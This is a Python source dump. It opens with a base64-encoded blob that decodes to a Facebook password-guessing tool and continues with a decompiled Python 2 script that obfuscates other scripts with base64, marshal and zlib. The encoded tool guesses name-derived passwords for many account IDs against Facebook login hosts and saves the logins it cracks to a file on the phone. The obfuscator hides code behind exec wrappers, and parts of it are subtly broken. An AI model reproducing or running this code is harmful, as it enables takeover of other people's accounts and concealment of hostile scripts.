X3R0bC5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCA9IGJ1bGFuX3R0bFttb250aF0NCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCdcciVzIFwwMzNbMTs5NG1bU0FKSkFELUNQXSAlcyB8ICVzICcgJSAoSyx1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHdydCA9ICclc3wlcycgJSAodXNlcixwdykNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCh3cnQpDQogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL1NBSkpBRC1DUC50eHQnICwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpDQogICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIGRheSAgID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xyJXMgXDAzM1sxOzk0bVtTQUpKQUQtQ1BdICVzIHwgJXMgJyAlIChLLHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpDQogICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCh3cnQpDQogICAgICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvU0FKSkFELUNQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KIA0KICAgICAgICAgICAgbG9vcCs9MQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNoYWNoYWppKQ0KICAgIGRlZiBfX3BsZXJfXyhzZWxmKToNCiAgICAgICAgY2hpID0gKCcyJykNCiAgICAgICAgaWYgY2hpID09ICcnOg0KICAgICAgICAgICAgcHJpbnQoJ1xuU2VsZWN0IENvcnJlY3QgT25lJyk7c2VsZi5fX3BsZXJfXygpDQogICAgICAgIGVsaWYgY2hpIGluICgnMScsICcwMScpOg0KICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgICAgICBsb2dvKCkNCiAgICAgICAgICAgIHByaW50KCcnKQ0KICAgICAgICAgICAgcHJpbnQoJyBcMDMzWzE7NDk7MzltIFRPVEFMIElEWiA6ICVzJXMnICUobGVuKHNlbGYuaWQpLE8pKQ0KICAgICAgICAgICAgcHJpbnQoJyBcMDMzWzE7OTNtIFVTRSBGTElHSFQgTU9ERSBJRiBTUEVFRCBBUkUgU0xPVyAnKQ0KICAgICAgICAgICAgcHJpbnQoJyBcMDMzWzE7OTJtIElOIFRIRSBCQUNLR1JPVU5EICcpDQogICAgICAgICAgICBwcmludCgnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpDQogICAgICAgICAgICBwcmludCgnJykNCiAgICAgICAgICAgIHdpdGggS0lOR05BU0VFUihtYXhfd29ya2Vycz0zMCkgYXMga2lyaW06DQogICAgICAgICAgICAgICAgZm9yIHRoYW5rbWUgaW4gc2VsZi5pZDogIyBZbyBOZGFrIFRhdSBLb2sgVGFueWEgU2FpYQ0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB0aGFua21lLnNwbGl0KCd8JykNCiAgICAgICAgICAgICAgICAgICAgICAgIHh6ID0gbmFtZS5zcGxpdCgnICcpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oeHopID09IDMgb3IgbGVuKHh6KSA9PSA0IG9yIGxlbih4eikgPT0gNSBvciBsZW4oeHopID09IDY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Iix4elswXSsiMTIzNCIseHpbMF0rIjEyMzQ1NiJdDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSIseHpbMF0rIjEyMzQiLHh6WzBdKyIxMjM0NTYiXQ0KICAgICAgICAgICAgICAgICAgICAgICAga2lyaW0uc3VibWl0KHNlbGYuX19tZXRvZGVfXywgdWlkLCBwd3gsICJtYmFzaWMuZmFjZWJvb2suY29tIikNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KIA0KICAgICAgICAgICAgVEhFU0FKSkFEKE9LLGNwKQ0KICAgICAgICBlbGlmIGNoaSBpbiAoJzInLCAnMDInKToNCiANCiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICAgICAgbG9nbygpDQogICAgICAgICAgICBwcmludCgnJykNCiAgICAgICAgICAgIHByaW50KCIgXDAzM1sxOzk3bSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgICAgICAgICBwcmludCgnIFwwMzNbMTs5N20gVE9UQUwgSURaIDogJXMlcycgJShsZW4oc2VsZi5pZCksTykpDQogICAgICAgICAgICBwcmludCgnIFwwMzNbMTs5MW0gVVNFIEZMSUdIVCBNT0RFIElGIFNQRUVEIEFSRSBTRUxPVycpDQogICAgICAgICAgICBwcmludCgnIFwwMzNbMTs5Mm0gQ1JBQ0sgSEFTIEJFRU4gU1RBUlRFRCcpDQogICAgICAgICAgICBwcmludCgiIFwwMzNbMTs5N20gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIik7dGltZS5zbGVlcCgwLjAzKQ0KICAgICAgICAgICAgcHJpbnQoJycpDQogICAgICAgICAgICB3aXRoIEtJTkdOQVNFRVIobWF4X3dvcmtlcnM9MzApIGFzIGtpcmltOg0KICAgICAgICAgICAgICAgIGZvciB0aGFua21lIGluIHNlbGYuaWQ6ICMgQ0hFQ0tfVEhFX1BPV0VSX09GX1lPVVJfREFEDQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVpZCwgbmFtZSA9IHRoYW5rbWUuc3BsaXQoJ3wnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgeHogPSBuYW1lLnNwbGl0KCcgJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih4eikgPT0gMyBvciBsZW4oeHopID09IDQgb3IgbGVuKHh6KSA9PSA1IG9yIGxlbih4eikgPT0gNjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiLHh6WzBdKyIxMjM0Iix4elswXSsiMTIzNDU2Il0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Iix4elswXSsiMTIzNCIseHpbMF0rIjEyMzQ1NiJdDQogICAgICAgICAgICAgICAgICAgICAgICBraXJpbS5zdWJtaXQoc2VsZi5fX21ldG9kZV9fLCB1aWQsIHB3eCwgInguZmFjZWJvb2suY29tIikNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KIA0KICAgICAgICAgICAgVEhFU0FKSkFEKE9LLGNwKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoJ1xuIFNlbGVjdCBWYWxpZCBPbmUnKTtzZWxmLl9fcGxlcl9fKCkNCiANCiANCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQoNCiAgICBweXRob25famF2YSgpDQogDQog"))
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.18 (default, Apr  9 2022, 12:24:03) 
+# [GCC Android (7714059, based on r416183c1) Clang 12.0.8 (https://android.google
+# Embedded file name: aso
+from sys import stdout
+import subprocess as sp, os, sys, time, random, base64, marshal, getpass, re, zlib
+m = '\x1b[1;91m'
+u = '\x1b[1;95m'
+h = '\x1b[1;92m'
+p = '\x1b[1;37m'
+k = '\x1b[1;33m'
+b = '\x1b[1;34m'
+bm = '\x1b[96m'
+about = ('\n                {}Creator           : {}Mhank BarBar\n                {}About             : {}Encrypt And Decrypt Tool\n                {}Version           : {}1.0 (beta)\n                {}Special thanks to : {}Allah SWT and YOU\n                {}Code name         : {}Tytyd:v\n                {}Team              : {}UNDERGROUND SCIENCE\n                {}E-mail            : {}royani7896@gmail.com\n                {}Github            : {}github.com/MhankBarBar\n                {}Telegram          : {}t.me/MhankBarBar\n                {}Facebook          : {}Upss (Fb gua masih kena cp:v)\n                {}Date              : {}16.49 02-02-2020\n                {}Region            : {}Tangerang,Banten, Indonesia').format(p, k, p, k, p, k, p, k, p, k, p, k, p, k, p, k, p, k, p, k, p, k, p, k, p, k)
+
+def chat():
+    load('Silahkan Tunggu Sebentar---')
+    os.system('xdg-open https://api.whatsapp.com/send?phone=6285693587969&text=Assalamualaikum+Roy+Lu+Masih+Jual+Janda?')
+
+
+kunci = ('\n \t{} \xe2\x96\x84\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84{} *Hello Dude!!\n\t{} \xe2\x96\x88   \xe2\x96\x88{} *Where Are You?\n\t\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88         \xe2\x96\x84\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84\n\t\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88  \xe2\x96\x88\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88  \xe2\x96\x88\n\t\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  \xe2\x96\x80 \xe2\x96\x80     \xe2\x96\x80\xe2\x96\x80').format(m, p, m, p)
+
+def lisensi_enc():
+    clr()
+    print kunci
+    print ('{}[{}!{}] {}Upss!! Sorry Dude This Tools Requiress Password').format(m, p, m, p)
+    paswd = getpass.getpass(('{}[{}\xc3\x97{}]{} Input Password {}>> {}').format(m, p, m, p, k, p))
+    if paswd == 'IhhAkuMah':
+        jalan('Password Benar \xe2\x9c\x93 ', 0.1)
+        time.sleep(2)
+        menu_enc()
+    elif paswd == '':
+        run('Masukkan Password Nya !!')
+        time.sleep(1.5)
+        lisensi_enc()
+    else:
+        jalan('Password Salah!!', 0.1)
+        chat()
+
+
+def lisensi_dec():
+    clr()
+    print kunci
+    print ('{}[{}!{}] {}Upss!! Sorry Dude This Tools Requiress Password').format(m, p, m, p)
+    paswd = getpass.getpass(('{}[{}\xc3\x97{}]{} Input Password {}>> {}').format(m, p, m, p, k, p))
+    if paswd == 'IhhAkuMah':
+        run('Password Benar')
+        time.sleep(2)
+        menu_dec()
+    elif paswd == '':
+        run('Masukkan Password Nya !!')
+        time.sleep(1.5)
+        lisensi_dec()
+    else:
+        run('Password Salah!!')
+        chat()
+
+
+try:
+    from uncompyle6.main import decompile
+except Exception as e:
+    sp.call('pip2 install uncompyle6', shell=True, stderr=sp.STDOUT)
+
+red = '\x1b[31m'
+green = '\x1b[32m'
+yellow = '\x1b[33m'
+blue = '\x1b[34m'
+magenta = '\x1b[35m'
+cyan = '\x1b[36m'
+white = '\x1b[37m'
+reset = '\x1b[39m'
+brblack = '\x1b[90m'
+R = '\x1b[91m'
+brgreen = '\x1b[92m'
+k = '\x1b[93m'
+brblue = '\x1b[94m'
+brmgnt = '\x1b[95m'
+brcyan = '\x1b[96m'
+G = '\x1b[97m'
+
+def jalan(z, t):
+    for e in z:
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(t)
+
+
+def load(word):
+    lix = ['/', '-', '\xe2\x95\xb2', '|']
+    for i in range(5):
+        for x in range(len(lix)):
+            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
+            time.sleep(0.2)
+            sys.stdout.flush()
+
+
+def banner_dec():
+    banner = (' \n{}:::::::-.  .,::::::    .,-:::::      ...     .        :   ::::::::::. ::: :::     .,::::::  \n ;;,   ``;,;;;;````  ,;;;``````   .;;;;;;;.  ;;,.    ;;;   `;;;```.;;;;;; ;;;     ;;;;````  \n `[[     [[ [[cccc   [[[         ,[[     \\[[,[[[[, ,[[[[,   `]]nnn]]\' [[[ [[[      [[cccc   \n{}  $$,    $$ $$""""   $$$         $$$,     $$$$$$$$$$$"$$$    $$$""    $$$ $$\'      $$""""   \n  888_,o8P\' 888oo,__ `88bo,__,o, "888,_ _,88P888 Y88" 888o   888o     888o88oo,.__ 888oo,__ \n  MMMMP"`   """"YUMMM  "YUMMMMMP"  "YMMMMMP" MMM  M\'  "MMM   YMMMb    MMM""""YUMMM """"YUMMM').format(m, p)
+    running(banner)
+
+
+def banner_enc():
+    banner = ('\n{} \xe2\x96\x88\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x96\x88 \xe2\x96\x84\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x84\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\n \xe2\x96\x88\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x88\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x88\xe2\x94\x80 \xe2\x96\x88\xe2\x96\x90\xe2\x96\x88\xe2\x96\x80 \xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80 \xe2\x96\x88\xe2\x94\x80\xe2\x96\x88 \xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\n \xe2\x96\x80\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x80 \xe2\x94\x80\xe2\x96\x80 \xe2\x96\x80\xe2\x94\x80\xe2\x96\x80\xe2\x96\x80 \xe2\x94\x80\xe2\x94\x80\xe2\x96\x80\xe2\x94\x80\xe2\x94\x80 \xe2\x96\x88\xe2\x96\x80\xe2\x94\x80 \xe2\x94\x80\xe2\x96\x80\xe2\x94\x80').format(m)
+    running(banner)
+
+
+def running(s):
+    try:
+        for c in s + '\n':
+            sys.stdout.write(c)
+            sys.stdout.flush()
+            time.sleep(0.001)
+
+    except (KeyboardInterrupt, EOFError):
+        run('Nonaktif!!!')
+
+
+def run(x):
+    pt = '\x1b[1;37m'
+    rd = '\x1b[1;37m\x1b[1;31m'
+    rg = '\x1b[6;32m'
+    try:
+        num = 0
+        while num < 1:
+            for i, char in enumerate(x):
+                if i == 0:
+                    print '\r%s%s%s%s' % (rg, char.lower(), rd, x[1:]),
+                    sys.stdout.flush()
+                else:
+                    if i == 1:
+                        roy = x[0].lower()
+                        print '\r%s%s%s%s%s%s' % (rd, roy, pt, char.lower(), rg, x[2:]),
+                        sys.stdout.flush()
+                    elif i == i:
+                        roy = x[0:i].lower()
+                        print '\r%s%s%s%s%s%s' % (rd, roy, pt, char.lower(), rg, x[i + 1:]),
+                        sys.stdout.flush()
+                    time.sleep(0.07)
+
+            num += 1
+
+    except:
+        exit()
+
+
+def clr():
+    os.system('clear')
+
+
+def logo():
+    banner_enc()
+
+
+def b_menu():
+    bm = ('{}\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\xe2\x95\x91{}[{}+{}]{}DeCoded: Javed Iqbal Sad Boy              \xe2\x95\x91\n\xe2\x95\x91{}[{}+{}]{}Github  : https://github.com/BALOOXH-BRAND\xe2\x95\x91\n\xe2\x95\x91{}[{}+{}]{}Tools    : Encrypt And Decrypt            \xe2\x95\x91\n\xe2\x95\x91{}[{}+{}]{}Create   : 01 - 29 - 2022                 \xe2\x95\x91\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d').format(p, m, p, m, p, m, p, m, p, m, p, m, p, m, p, m, p)
+    jalan(bm, 0.001)
+
+
+def menu():
+    clr()
+    b_menu()
+    print ('\n{}Happy Encompile And Decompile menu :){}').format(brblue, reset)
+    running(('\n{}[{}1{}]{}.Encrypt\n{}[{}2{}]{}.Decrypt\n{}[{}3{}]{}.Report Bug\n{}[{}4{}]{}.About\n{}[{}5{}]{}.Update Tools').format(m, p, m, p, m, p, m, p, m, p, m, p, m, p, m, p, m, p, m, p))
+    fuck = raw_input(('{}[{}?{}]{} Choose {}>> {}').format(m, p, m, p, k, p))
+    if fuck == '1' or fuck == '01':
+        load('Silahkan Tunggu Sebentar >--')
+        menu_enc()
+    elif fuck == '2' or fuck == '02':
+        load('Silahkan Tunggu Sebentar >--')
+        menu_dec()
+    elif fuck == '':
+        run('Jangan Kosong Gblk!!')
+        menu()
+    elif fuck == '3' or fuck == '03':
+        jalan(p + 31 * '\xe2\x95\x90' + h + '[' + bm + 'Haii' + h + ']' + p + '>', 0.008)
+        print '\n' + h + '[' + m + '!' + h + ']' + p + ' Chat Via WhatsApp '
+        chat = raw_input(h + '[' + k + '?' + h + ']' + p + ' Enter your message : ')
+        chat.replace(' ', '%20')
+        load(h + '[' + k + '~' + h + ']' + p + 'Loading please wait ...')
+        try:
+            sp.check_output([
+             'am', 'start',
+             'https://api.whatsapp.com/send?phone=6285693587969&text=Report : ' + chat + ''])
+        except:
+            sys.exit('\n' + h + '[' + k + '!' + h + ']' + p + ' Failed to send message ')
+
+    elif fuck == '4' or fuck == '04':
+        load('Silahkan Tunggu Sebentar >--')
+        clr()
+        running(about)
+        time.sleep(5)
+        menu()
+    elif fuck == '5' or fuck == '05':
+        load('Silahkan Tunggu Sebentat >--')
+        clr()
+        os.system('git pull')
+    else:
+        run('Pilihannya Cuma 1,2,3,4 & 5 Doang Kontol!!')
+        menu()
+
+
+def menu_enc():
+    clr()
+    banner_enc()
+    running('---------------')
+    running(('{}[{}01{}]{} Encrypt Base16').format(m, p, m, k))
+    running(('{}[{}02{}]{} Encrypt Base32').format(m, p, m, k))
+    running(('{}[{}03{}]{} Encrypt Base64').format(m, p, m, k))
+    running(('{}[{}04{}]{} Encrypt Hex').format(m, p, m, k))
+    running(('{}[{}05{}]{} Encrypt Marshal').format(m, p, m, k))
+    running(('{}[{}06{}]{} Compile py > pyc').format(m, p, m, k))
+    running(('{}[{}07{}]{} Encrypt Marshal Zlib Base64').format(m, p, m, k))
+    running(('{}[{}08{}]{} Encrypt Zlib ').format(m, p, m, k))
+    running(('{}[{}00{}]{} Exit').format(m, p, m, k))
+    running('---------------')
+    try:
+        inp = raw_input(('{}[{}??{}]{} Choose {}>>{} ').format(m, p, m, k, h, p))
+    except (KeyboardInterrupt, EOFError):
+        run('Nonaktif!!')
+        menu()
+
+    if inp == '1' or inp == '01':
+        clr()
+        Satu()
+    elif inp == '2' or inp == '02':
+        clr()
+        Dua()
+    elif inp == '3' or inp == '03':
+        clr()
+        Tiga()
+    elif inp == '4' or inp == '04':
+        clr()
+        Empat()
+    elif inp == '5' or inp == '05':
+        clr()
+        Lima()
+    elif inp == '6' or inp == '06':
+        clr()
+        pyc()
+    elif inp == '7' or inp == '07':
+        clr()
+        emzb()
+    elif inp == '8' or inp == '08':
+        clr()
+        ezl()
+    elif inp == '':
+        run('Pilih Nomornya Woe!!!')
+        time.sleep(2)
+        menu_enc()
+    elif inp == '0' or inp == '00':
+        exit()
+    else:
+        run('Salah Memasukkan Pilihan!!')
+        time.sleep(2)
+        menu_enc()
+
+
+def menu_dec():
+    clr()
+    banner_dec()
+    running('---------------')
+    running(('{}[{}01{}]{} Decrypt base16').format(m, p, m, k))
+    running(('{}[{}02{}]{} Decrypt base32').format(m, p, m, k))
+    running(('{}[{}03{}]{} Decrypt base64').format(m, p, m, k))
+    running(('{}[{}04{}]{} Decrypt Hex').format(m, p, m, k))
+    running(('{}[{}05{}]{} Decrypt Marshal').format(m, p, m, k))
+    running(('{}[{}06{}]{} Uncompyle6 pyc > py').format(m, p, m, k))
+    running(('{}[{}07{}]{} Decrypt Marshal,Zlib,Base64').format(m, p, m, k))
+    running(('{}[{}08{}]{} Decrypt Zlib').format(m, p, m, k))
+    running(('{}[{}00{}]{} Exit').format(m, p, m, k))
+    running('---------------')
+    try:
+        inp = raw_input(('{}[{}??{}]{} Choose {}>>{} ').format(m, p, m, k, h, p))
+    except (KeyboardInterrupt, EOFError):
+        run('Nonaktif!!')
+        menu()
+
+    if inp == '1' or inp == '01':
+        clr()
+        Enam()
+    elif inp == '2' or inp == '02':
+        clr()
+        Tujuh()
+    elif inp == '3' or inp == '03':
+        clr()
+        Delapan()
+    elif inp == '4' or inp == '04':
+        clr()
+        Sembilan()
+    elif inp == '5' or inp == '05':
+        clr()
+        unmarsh()
+    elif inp == '6' or inp == '06':
+        clr()
+        unpyc()
+    elif inp == '7' or inp == '07':
+        clr()
+        mzb()
+    elif inp == '8' or inp == '08':
+        clr()
+        zl()
+    elif inp == '':
+        run('Pilih Nomornya Woe!!!')
+        time.sleep(2)
+        menu_dec()
+    elif inp == '0' or inp == '00':
+        exit()
+    else:
+        run('Salah Memasukkan Pilihan!!')
+        time.sleep(2)
+        menu_dec()
+
+
+def Satu():
+    clr()
+    logo()
+    try:
+        f = raw_input('Filenames: ')
+    except:
+        exit()
+
+    try:
+        bk = open(f, 'r').read()
+    except:
+        run('file %s tidak ditemukan ' % f)
+        time.sleep(1.5)
+        Satu()
+
+    en = base64.b16encode(bk)
+    ff = f + 'c'
+    open(ff, 'w').write('import base64\nexec(base64.b16decode("%s"))' % en)
+    nm = ('').join(f.split('.')[:1]) + '-enc.py'
+    os.rename(ff, nm)
+    run('file berhasil di encrypt menjadi %s ' % nm)
+
+
+def Dua():
+    clr()
+    logo()
+    try:
+        f = raw_input('Filenames: ')
+    except:
+        exit()
+
+    try:
+        bk = open(f, 'r').read()
+    except:
+        run('file %s tidak ditemukan ' % f)
+        exit()
+
+    en = base64.b32encode(bk)
+    ff = f + 'c'
+    open(ff, 'w').write('import base64\nexec(base64.b32decode("' + en + '"))')
+    nm = ('').join(f.split('.')[:1]) + '-enc.py'
+    os.rename(ff, nm)
+    run('file berhasil di encrypt menjadi %s ' % nm)
+
+
+def Tiga():
+    clr()
+    logo()
+    try:
+        f = raw_input('Filenames: ')
+    except:
+        exit()
+
+    try:
+        bk = open(f, 'r').read()
+    except:
+        run('file %s tidak ditemukan ' % f)
+        exit()
+
+    en = base64.b64encode(bk)
+    ff = f + 'c'
+    open(ff, 'w').write('import base64\nexec(base64.b64decode("' + en + '"))')
+    nm = ('').join(f.split('.')[:1]) + '-enc.py'
+    os.rename(ff, nm)
+    run('file berhasil di encrypt menjadi %s ' % nm)
+
+
+def Empat():
+    clr()
+    logo()
+    try:
+        f = raw_input('Filenames: ')
+    except:
+        exit()
+
+    try:
+        bk = open(f, 'r').read()
+    except:
+        run('file %s tidak ditemukan ' % f)
+        exit()
+
+    en = bk.encode('hex')
+    ff = f + 'c'
+    open(ff, 'w').write('exec("' + en + '").decode("hex")')
+    nm = ('').join(f.split('.')[:1]) + '-enc.py'
+    os.rename(ff, nm)
+    run('file berhasil di encrypt menjadi %s ' % nm)
+
+
+def Lima():
+    clr()
+    logo()
+    try:
+        f = raw_input('Filenames: ')
+    except:
+        exit()
+
+    try:
+        bk = open(f, 'r').read()
+    except:
+        run('file %s tidak ditemukan ' % f)
+        exit()
+
+    c = compile(bk, '<roy>', 'exec')
+    en = marshal.dumps(c)
+    ff = f + 'c'
+    open(ff, 'w').write('import marshal\nexec(marshal.loads(' + repr(en) + '))')
+    nm = ('').join(f.split('.')[:1]) + '-enc.py'
+    os.rename(ff, nm)
+    run('file berhasil di encrypt menjadi %s ' % nm)
+
+
+def emzb():
+    clr()
+    logo()
+    try:
+        file = raw_input('File: ')
+        fileopen = open(file).read()
+        no = compile(fileopen, 'aso', 'exec')
+        b = marshal.dumps(no)
+        c = zlib.compress(b)
+        d = base64.b64encode(c)
+        e = 'import marshal,zlib,base64\nexec(marshal.loads(zlib.decompress(base64.b64decode("' + d + '"))))'
+        f = file.replace('.py', '-enc.py')
+        g = open(f, 'w')
+        g.write(e)
+        g.close()
+        run('file berhasil di encrypt menjadi %s ' % f)
+        raw_input('Tekan Enter Untuk Kembali Ke Menu')
+        menu()
+    except IOError:
+        run('file tidak ditemukan ')
+        raw_input('Tekan Enter Untuk Kembali Ke Menu')
+        emzb()
+
+
+def ezl():
+    print 'Encrypt Zlib'
+    file = raw_input('File : ')
+    out = file.replace('.py', '-enc.py')
+    oa = open(file).read()
+    xs = zlib.compress(oa)
+    s = open(out, 'w')
+    s.write('import zlib\nexec(zlib.decompress(' + repr(xs) + '))')
+    s.close()
+    print 'File saved as ' + out
+
+
+def Enam():
+    clr()
+    banner_dec()
+    try:
+        print 'Dec base64.b16decocde'
+        f = raw_input('Filenames: ')
+    except:
+        exit()
+
+    try:
+        bk = open(f, 'r').read()
+    except:
+        run('file %s tidak ditemukan ' % f)
+        exit()
+
+    bk = bk.replace('exec(base64.b16decode("', '')
+    bk = bk.replace('"))', '')
+    bk = bk.replace('import base64\n', '')
+    en = base64.b16decode(bk)
+    ff = f + 'c'
+    open(ff, 'w').write(en)
+    nm = ('').join(f.split('.')[:1]) + '-dec.py'
+    os.rename(ff, nm)
+    run('file berhasil di decrypt menjadi %s ' % nm)
+
+
+def Tujuh():
+    clr()
+    banner_dec()()
+    try:
+        print 'Dec base64.b32decode'
+        f = raw_input('Filenames: ')
+    except:
+        exit()
+
+    try:
+        bk = open(f, 'r').read()
+    except:
+        run('file %s tidak ditemukan ' % f)
+        exit()
+
+    bk = bk.replace('exec(base64.b32decode("', '')
+    bk = bk.replace('"))', '')
+    bk = bk.replace('import base64\n', '')
+    en = base64.b32decode(bk)
+    ff = f + 'c'
+    open(ff, 'w').write(en)
+    nm = ('').join(f.split('.')[:1]) + '-dec.py'
+    os.rename(ff, nm)
+    run('file berhasil di decrypt menjadi %s ' % nm)
+
+
+def Delapan():
+    clr()
+    banner_dec()
+    try:
+        print 'Dec base64.b64decode'
+        f = raw_input('Filenames: ')
+    except:
+        exit()
+
+    try:
+        bk = open(f, 'r').read()
+    except:
+        run('file %s tidak ditemukan ' % f)
+        exit()
+
+    bk = bk.replace(+'exec(base64.b64decode("', '')
+    bk = bk.replace('"))', '')
+    bk = bk.replace('import base64\n', '')
+    en = base64.b64decode(bk)
+    ff = f + 'c'
+    open(ff, 'w').write(en)
+    nm = ('').join(f.split('.')[:1]) + '-dec.py'
+    os.rename(ff, nm)
+    run('file berhasil di decrypt menjadi %s ' % nm)
+
+
+def Sembilan():
+    clr()
+    banner_dec()
+    try:
+        print 'Dec hex'
+        f = raw_input('Filenames: ')
+    except:
+        exit()
+
+    try:
+        bk = open(f, 'r').read()
+    except:
+        run('file %s tidak ditemukan ' % f)
+        exit()
+
